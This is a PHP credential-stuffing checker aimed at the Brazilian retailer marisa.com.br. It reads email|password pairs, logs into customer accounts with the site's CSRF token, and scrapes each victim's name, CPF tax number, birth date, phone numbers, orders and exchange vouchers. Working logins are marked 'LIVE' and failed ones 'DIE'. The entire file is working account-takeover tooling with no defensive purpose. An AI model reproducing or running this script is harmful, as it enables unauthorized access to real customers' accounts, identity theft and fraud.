
<?php
set_time_limit(0);
error_reporting(0);


class cURL {
    var $callback = false;
    function setCallback($func_name) {
        $this->callback = $func_name;
    }
    function doRequest($method, $url, $vars) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_NOBODY, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 200);
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        if ($method == 'POST') {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $vars);
        }
        $data = curl_exec($ch);
       // echo $data;
        curl_close($ch);

        if ($data) {
            if ($this->callback) {
                $callback = $this->callback;
                $this->callback = false;
                return call_user_func($callback, $data);
            } else {
                return $data;
            }
        } else {
            return curl_error($ch);
        }
    }
    function get($url) {
        return $this->doRequest('GET', $url, 'NULL');
    }
    function post($url, $vars) {
        return $this->doRequest('POST', $url, $vars);
    }
}

function GetStr($string,$start,$end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}


$linha = $_GET["linha"];
$email = explode("|", $linha)[0];
$senha = explode("|", $linha)[1];

/* switch ($ano) {
    case '2017':
        $ano = '17';
        break;
    case '2018':
        $ano = '18';
        break;
    
    case '2019':
        $ano = '19';
        break;
        case '2020':
        $ano = '20';
        break;
        case '2021':
        $ano = '21';
        break;
        case '2022':
        $ano = '22';
        break;
      
        case '2023':
        $ano = '23';
        break;
        case '2025':
        $ano = '25';
        break;
        case '2026':
        $ano = '26';
        break;
        
} */

$nc = new cURL();
$getoken = $nc->get('https://www.marisa.com.br/');
$token = getStr($getoken,'<input type="hidden" name="CSRFToken" value="','" />');


$a = new cURL();
$b = $a->post('https://www.marisa.com.br/j_spring_security_check', 'j_username='.$email.'&j_password='.$senha.'&CSRFToken='.$token.'');
        

$nc2 = new cURL();
$getlive = $nc2->get('https://www.marisa.com.br/my-account/profile');

$nc3 = new cURL();
$getinfo = $nc3->get('https://www.marisa.com.br/my-account/update-profile');

$nc4 = new cURL();
$getone = $nc4->get('https://www.marisa.com.br/my-account/voucher-exchange');

$nc5 = new cURL();
$getped = $nc5->get('https://www.marisa.com.br/my-account/orders');

               
        if (strpos($getped, 'VOCÊ AINDA NÃO POSSUI PEDIDOS!')) { 

 $pedidos = "Não";

        }else{

        $pedidos = "Sim";

}

        if (strpos($getone, 'NÃO HÁ VALES TROCA DISPONÍVEIS ATÉ O MOMENTO.')) { 

 $one = "Não";

        }else{

        $one = "Sim";

}



$nome = getStr($getinfo,'<input id="customerFirstName" name="firstName" class="form-control-square  form-control" tabindex="1" data-lbKey="Nome Completo" type="text" required="true" value="','"');

$cpf = getStr($getinfo,'<span class="form-control-square form-control" readonly="readonly">','</span>');

$dataa = getStr($getinfo,'data-lbKey="Data de Nascimento" type="text" required="true" value="','"/>');


$ddd = getStr($getinfo,'data-lbkey="DDD" placeholder="DDD" required="true" type="text" value="','" maxlength="2"/');
$celular = getStr($getinfo,'data-lbkey="Celular" required="true" type="text" value="','"');


$ddd2 = getStr($getinfo,'<input id="dddPhoneNumber" name="dddPhoneNumber" class="form-control form-control-square" tabindex="5" data-allow="numbers" placeholder="ddd" type="text" value="','" maxlength="2"/>');
$telefone = getStr($getinfo,'data-component-mask="phone" placeholder="telefone* - ex: 0000-0000" type="text" value="','"');

if($telefone == ""){ $telefone = "N/A"; }
if($ddd2 == ""){ $ddd2 = "-"; }


if (file_exists(getcwd().'/cookie.txt')) {
            unlink(getcwd().'/cookie.txt');
        }
               
        if (strpos($getlive, 'Meu Perfil')) { 

 echo "LIVE → $email|$senha | Nome: $nome | CPF: $cpf | Data de Nascimento: $dataa | Celular: ($ddd) $celular | Telefone: ($ddd2) $telefone | Vale Troca: $one | Pedidos: $pedidos #FlashReverso";
 
  

        }else{

        echo "DIE → $email|$senha";
   

}
 
    


?>
